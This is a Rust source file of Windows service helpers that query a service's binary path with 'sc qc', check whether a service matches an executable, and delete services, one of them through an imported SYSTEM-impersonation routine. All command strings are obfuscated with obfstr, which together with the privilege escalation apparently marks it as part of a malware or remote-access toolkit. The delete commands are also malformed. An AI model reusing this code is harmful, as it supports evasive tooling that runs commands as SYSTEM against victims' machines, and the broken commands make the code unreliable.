use std::process::Output;
use anyhow::{ anyhow, Result };
use obfstr::obfstr as s;
use shared::{ uac::impersonate_system::execute_file_as_system, utils::functions::{ call_cmd } };

pub fn get_service_exe_path(service_name: &str) -> Result<String> {
    let output = call_cmd(&format!("{}{}", s!("sc qc "), service_name))?;

    let output_str = String::from_utf8_lossy(&output.stdout);
    let lines: Vec<&str> = output_str.split('\n').collect();

    for line in lines {
        if line.trim().starts_with(s!("BINARY_PATH_NAME")) {
            let parts: Vec<&str> = line.split(':').collect();
            if parts.len() > 1 {
                let path = parts[1..].join(":");
                return Ok(path.trim().to_string());
            }
        }
    }

    Err(anyhow!("{}{}", s!("Failed to find BINARY_PATH_NAME for service: "), service_name))
}

pub fn service_exists_and_exe_matches(service_name: &str, exe_path: &str) -> Result<bool> {
    let output = call_cmd(&format!("{}{}", s!("sc qc "), service_name))?;

    let output_str = String::from_utf8_lossy(&output.stdout);

    if
        output_str.contains(s!("The specified service does not exist as an installed service")) ||
        output_str.contains(s!("OpenService FAILED 1060"))
    {
        return Ok(false);
    }

    let lines: Vec<&str> = output_str.split('\n').collect();

    for line in lines {
        if line.trim().starts_with(s!("BINARY_PATH_NAME")) {
            let parts: Vec<&str> = line.split(':').collect();
            if parts.len() > 1 {
                let path = parts[1..].join(":");
                if path.trim() == exe_path {
                    return Ok(true);
                }
            }
        }
    }

    // exist but doesnt match
    Ok(false)
}
pub fn delete_service(service_name: &str) -> Result<Output> {
    let command = format!("{}{}{}", s!("sc delete "), service_name, s!("/force /noconfirm"));
    call_cmd(&command)
}
pub fn delete_system_service(service_name: &str) -> Result<()> {
    let command = format!("{}{}{}", s!("sc delete "), service_name, s!("/force /noconfirm"));
    execute_file_as_system(s!("sc"), Some(&command), false)
}
